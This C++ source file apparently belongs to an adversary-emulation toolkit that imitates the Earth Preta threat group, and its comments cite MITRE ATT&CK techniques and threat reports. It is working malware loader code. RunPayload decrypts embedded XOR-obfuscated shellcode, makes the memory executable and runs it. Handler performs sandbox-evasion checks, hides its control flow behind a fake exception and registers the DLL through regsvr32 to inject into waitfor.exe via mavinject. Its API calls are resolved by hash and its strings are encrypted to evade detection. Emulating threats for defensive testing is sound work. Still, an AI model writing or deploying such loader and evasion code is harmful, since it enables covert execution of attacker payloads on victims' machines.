#include <stdexcept>
#include <expected>
#include <vector>
#include "handler.hpp"
#include "logger.hpp"
#include "xor.hpp"
#include "checks.hpp"
#include "util.hpp"
#include "register.hpp"
#include "handler_util.hpp"
#include <bcrypt.h>

#ifndef DESIRED_PROCESS_NAME
#error "handler.cpp must have DESIRED_PROCESS_NAME set at compile time"
#endif


// Define custom exception that will be used to trigger shellcode execution.
class CustomException: public std::runtime_error {
public:
    CustomException(const char* what_arg ) : std::runtime_error(what_arg) {}
};

/*
 * RunPayload:
 *      About:
 *          Copies the embedded shellcode into a buffer and executes it in memory.
 *      Result:
 *          Executed shellcode in memory
 *      MITRE ATT&CK Techniques:
 *          T1027.009 Obfuscated Files or Information: Embedded Payloads
 *          T1620 Reflective Code Loading
 *      CTI:
 *          https://www.trendmicro.com/en_us/research/25/b/earth-preta-mixes-legitimate-and-malicious-components-to-sidestep-detection.html
 *          https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html
 */
DWORD RunPayload(LPVOID _lpThreadParameter) {
    shared_func_pointers fp;
    logger_ctx log_ctx;

    DWORD result;
    LPVOID buffer = NULL;

    // Resolve APIs
    result = ResolveSharedApis(&fp);
    if (result != ERROR_SUCCESS) {
        return result;
    }
    VirtualAlloc_t fp_VirtualAlloc = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), VirtualAlloc);
    if (!fp_VirtualAlloc) {
        return FAIL_GET_VIRTUALALLOC;
    }
    VirtualProtect_t fp_VirtualProtect = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), VirtualProtect);
    if (!fp_VirtualProtect) {
        return FAIL_GET_VIRTUALPROTECT;
    }
    VirtualFree_t fp_VirtualFree = RESOLVE_FN_FNV1A(XorStringW(L"Kernel32.dll"), VirtualFree);
    if (!fp_VirtualFree) {
        return FAIL_GET_VIRTUALFREE;
    }

    result = AesLogger::InitializeLogger(&fp, XorStringW(WIDEN(DLL_SH_RUNNER_LOG_FILE)), ENCRYPTED_LOGGING, &log_ctx);
    if (result != ERROR_SUCCESS) {
        return result;
    }

    do {
        AesLogger::LogInfo(&log_ctx, XorString("================================"));
        AesLogger::LogInfo(&log_ctx, XorString("Initialized RunPayload() logger."));
        AesLogger::LogInfo(&log_ctx, XorString("================================"));

        // Decrypt XOR key
        AesLogger::LogDebug(&log_ctx, XorString("Decrypting XOR key."));
        unsigned char key[PAYLOAD_KEY_LEN];
        memcpy(key, embedded::payload_key.data(), PAYLOAD_KEY_LEN);
        encryption::XorInPlace(key, PAYLOAD_KEY_LEN, KEY_XOR_KEY);

        // Grab encrypted shellcode
        AesLogger::LogDebug(&log_ctx, XorString("Allocating buffer."));
        size_t buf_size = embedded::payload.size();
        buffer = fp_VirtualAlloc(NULL, buf_size, MEM_COMMIT, PAGE_READWRITE);
        if (buffer == NULL) {
            result = fp.fp_GetLastError();
            AesLogger::LogError(&log_ctx, XorString("Failed to allocate memory for buffer. Error code: %d"), result);
            break;
        }

        // Populate buffer with the shellcode and decrypt it
        AesLogger::LogDebug(&log_ctx, XorString("Decrypting buffer."));
        memcpy(buffer, embedded::payload.data(), buf_size);
        encryption::TripleXorInPlace((unsigned char*)buffer, buf_size, key, PAYLOAD_KEY_LEN);

        // Execute the shellcode
        DWORD old_protect;
        if (!fp_VirtualProtect(buffer, buf_size, PAGE_EXECUTE_READ, &old_protect)) {
            result = fp.fp_GetLastError();
            AesLogger::LogError(&log_ctx, XorString("Failed to change buffer permissions. Error code: %d"), result);
            break;
        }
        result = ((unsigned int(*)())buffer)();

        AesLogger::LogInfo(&log_ctx, XorString("Buffer result: %d"), result);
    } while (false);

    if (buffer != NULL) {
        fp_VirtualFree(buffer, 0, MEM_RELEASE);
    }

    AesLogger::CloseLogger(&log_ctx);

    // Terminate host process if shellcode exits
    ExitProcess(result);

    // Shouldn't reach here - keeping to maintain LPTHREAD_START_ROUTINE signature
    return EXIT_FAILURE;
}

/*
 * Handler:
 *      About:
 *          Performs anti-sandbox checks and then uses a custom exception handler to
 *          execute the malicious routine.
 *          The routine will register this DLL using regsvr32 to trigger DLL injection
 *          into waitfor.exe using mavinject.
 *      MITRE ATT&CK Techniques:
 *          T1497 Virtualization/Sandbox Evasion
 *          T1218.010 System Binary Proxy Execution: Regsvr32
 *          T1218.013 System Binary Proxy Execution: Mavinject
 *      CTI:
 *          https://www.trendmicro.com/en_us/research/22/k/earth-preta-spear-phishing-governments-worldwide.html
 *          https://www.trendmicro.com/en_us/research/25/b/earth-preta-mixes-legitimate-and-malicious-components-to-sidestep-detection.html
 */
void Handler() {
    shared_func_pointers fp;
    logger_ctx log_ctx;

    DWORD result;

    // Resolve APIs
    result = ResolveSharedApis(&fp);
    if (result != ERROR_SUCCESS) {
        ExitProcess(result);
    }

    try {
        do {
            result = AesLogger::InitializeLogger(&fp, XorStringW(WIDEN(DLL_HANDLER_LOG_FILE)), ENCRYPTED_LOGGING, &log_ctx);
            if (result != ERROR_SUCCESS) {
                ExitProcess(result);
            }

            AesLogger::LogInfo(&log_ctx, XorString("============================="));
            AesLogger::LogInfo(&log_ctx, XorString("Initialized Handler() logger."));
            AesLogger::LogInfo(&log_ctx, XorString("============================="));

            result = VerifyProcessName(XorStringW(WIDEN(DESIRED_PROCESS_NAME)));
            if (result == PROCESS_NAME_MISMATCH) {
                AesLogger::LogWarn(&log_ctx, XorString("Process name mismatch. Terminating."));
                break;
            } else if (result != ERROR_SUCCESS) {
                AesLogger::LogError(&log_ctx, XorString("Failed to verify process name. Error code: %d"), result);
                break;
            }

            AesLogger::LogInfo(&log_ctx, XorString("Process name check passed."));

            // Perform window check for up to 60 seconds
            result = ForegroundWindowCheck(60);
            if (result == WINDOW_CHECK_TIMEOUT) {
                AesLogger::LogError(&log_ctx, XorString("Window check timed out."));
                break;
            } else if (result != ERROR_SUCCESS) {
                AesLogger::LogError(&log_ctx, XorString("Failed to perform window check. Error code: %d"), result);
                break;
            }

            AesLogger::LogInfo(&log_ctx, XorString("Window check passed."));

            // This isn't an actual failure - the exception string here
            // is only there to make it look like an actual exception.
            throw CustomException(XorString("Failed check."));
        } while(false);
    } catch(const CustomException& e) {
        AesLogger::LogInfo(&log_ctx, XorString("Handling custom exception."));

        // Register DLL using regsvr32
        result = RegisterSelf(&log_ctx);

        if (result == ERROR_SUCCESS) {
            AesLogger::LogInfo(&log_ctx, XorString("Successfully registered self via regsvr32."));
        } else {
            AesLogger::LogError(&log_ctx, XorString("Failed to register self. Error code: %d"), result);
        }
    }

    AesLogger::CloseLogger(&log_ctx);
    ExitProcess(result);
}
